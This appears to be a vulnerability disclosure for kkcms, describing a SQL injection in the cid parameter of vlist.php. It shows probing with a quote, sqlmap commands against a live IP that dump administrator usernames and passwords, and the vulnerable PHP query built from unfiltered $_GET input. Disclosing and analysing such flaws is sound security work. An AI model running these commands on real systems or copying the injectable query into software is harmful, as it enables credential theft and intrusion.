# SQL injection vulnerability analysis in kkcms

**There is a vulnerability classified as severe in the cid parameter in templates/vlist. php. Performing SQL injection attacks on the cid parameter can obtain database information for the entire system.**

The kkcms source code has been uploaded to the 'kkcms_SourceCode' branch in this repository. 

Here is its original code repository address:[kkcms](https://github.com/jsyzjhj/kkcms)

## The following is the process of analysis:

### 1. Install and deploy kkcms on the server：

![](https://github.com/PrecursorYork/kkcms_SQLi/raw/vulnerability-analysis/0.png)

### 2. It was found that inputting special characters into the cid parameter in the `vlist.php` page will return an exception page. It is speculated that there is a SQL injection attack vulnerability here.

+ Input`cid=1`：
  ![](https://github.com/PrecursorYork/kkcms_SQLi/raw/vulnerability-analysis/1.png)
  The server returns to the normal page.

+ Input`cid=1'`to try closing the SQL query statement：
  ![](https://github.com/PrecursorYork/kkcms_SQLi/raw/vulnerability-analysis/2.png)
  The server returned an exception page. This indicates the existence of an SQL injection vulnerability.

### 3. Use SQL map tool for testing to confirm the existence of SQL injection vulnerabilities. It will cause the database information of the entire system to be leaked. Here is an example of administrator account password leakage:

+ ```
  python sqlmap.py -u "http://47.120.46.90/vlist.php?cid=1" --tables
  ```
  
  ![](https://github.com/PrecursorYork/kkcms_SQLi/raw/vulnerability-analysis/3.png)

+ ```
  python sqlmap.py -u "http://47.120.46.90/vlist.php?cid=1" --columns -T xtcms_manager
  ```
  
  ![](https://github.com/PrecursorYork/kkcms_SQLi/raw/vulnerability-analysis/4.png)

+ ```
  python sqlmap.py -u "http://47.120.46.90/vlist.php?cid=1" --dump -T xtcms_manager -C "m_name,m_password"
  ```
  
  ![](https://github.com/PrecursorYork/kkcms_SQLi/raw/vulnerability-analysis/5.png)

### 4. Check source code

1. `/vlist.php`:
   
   ```
      <?php 
   include('system/inc.php');
   include('template/'.$xtcms_bdyun.'/vlist.php');
   ?>
   ```
   
   Discovered the inclusion of two PHP files:`/system/inc.php` and`/template/wapian/vlist.php`. Among them, `/system/inc.php'`contains partially written escape functions.

2. Check `/template/wapian/vlist.php`, discovered the key code:
   
   ```
   <?php
   if ($_GET['cid'] != 0){
    ?>                  
   <?php
   $result = mysql_query('select * from xtcms_vod_class where c_pid='.$_GET['cid'].' order by c_sort desc,c_id asc');
   while ($row = mysql_fetch_array($result))
   {
   echo '<a href="./vlist.php?cid='.$row['c_id'].'" class="acat" style="white-space: pre-wrap;margin-bottom: 4px;">'.$row['c_name'].'</a>';
   }
   ?>
   ```
   
   There is no reference to the source code`.$_GET ['cid']`variable is filtered by directly using single quotation marks for wrapping, and the escape function written in`/system/inc.php`is not used for querying. This is where typical SQL injection vulnerabilities lie.


